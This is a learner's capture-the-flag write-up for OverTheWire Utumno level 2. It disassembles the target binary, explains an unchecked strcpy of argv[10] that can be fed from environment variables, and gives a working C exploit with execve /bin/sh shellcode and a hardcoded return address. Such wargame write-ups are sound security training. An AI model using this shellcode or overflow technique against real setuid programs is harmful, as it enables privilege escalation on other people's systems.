# Overthewire Utumno Level 2 Writeup

Since I am a newbie into reversing, this one is tough for me. After trying a lot of times, finally I took it down.
At the very beginning I tried to make the attacked program jump to an exported variable of the shell. Apparently it didn't work, since I have overwritten the `env` in the exploit. After a long time I found out all the `env`s have been flushed... Anyway here is the writeup.

I am given a small program which demands null argv to run, otherwise it quits:

```bash
$ gdb ./utumno2 -q
Reading symbols from ./utumno2...done.
(gdb) disas main
Dump of assembler code for function main:
   0x0804845d <+0>: push   %ebp
   0x0804845e <+1>: mov    %esp,%ebp
   0x08048460 <+3>: and    $0xfffffff0,%esp
   0x08048463 <+6>: sub    $0x20,%esp
   0x08048466 <+9>: cmpl   $0x0,0x8(%ebp)
   0x0804846a <+13>:  je     0x8048484 <main+39>
   0x0804846c <+15>:  movl   $0x8048540,(%esp)
   0x08048473 <+22>:  call   0x8048320 <puts@plt>
   0x08048478 <+27>:  movl   $0x1,(%esp)
   0x0804847f <+34>:  call   0x8048340 <exit@plt>
   0x08048484 <+39>:  mov    0xc(%ebp),%eax
   0x08048487 <+42>:  add    $0x28,%eax
   0x0804848a <+45>:  mov    (%eax),%eax
   0x0804848c <+47>:  mov    %eax,0x4(%esp)
   0x08048490 <+51>:  lea    0x14(%esp),%eax
   0x08048494 <+55>:  mov    %eax,(%esp)
   0x08048497 <+58>:  call   0x8048310 <strcpy@plt>
   0x0804849c <+63>:  mov    $0x0,%eax
   0x080484a1 <+68>:  leave
   0x080484a2 <+69>:  ret
End of assembler dump.
```

The vulnerability of this program is: It assumes that there should be some parameters given but it doesn't check how many of them are given. Since `argv` and `env` are placed in continuous memory. I have a chance here.
All the `env`s are under control and ASLR is disabled in the remote system. So the start address of `env` is fixed. I can pass null `argv` but 11 `env`s to trick the program. So it reads the 10th `env` as if it reads `argv[10]`.

The exploit:

```c
#include <unistd.h>

int main(){
        char *env[11];
        env[0]="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"; // shellcode here
        env[1]=env[2]=env[3]=env[4]=env[5]=env[6]=env[7]=env[8]="";
        env[9]="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7\xa9\xdf\xff\xff";
        env[10]=NULL;
        execve("/utumno/utumno2",NULL,env);
}
```

And then compile the exploit and run it to get the flag.
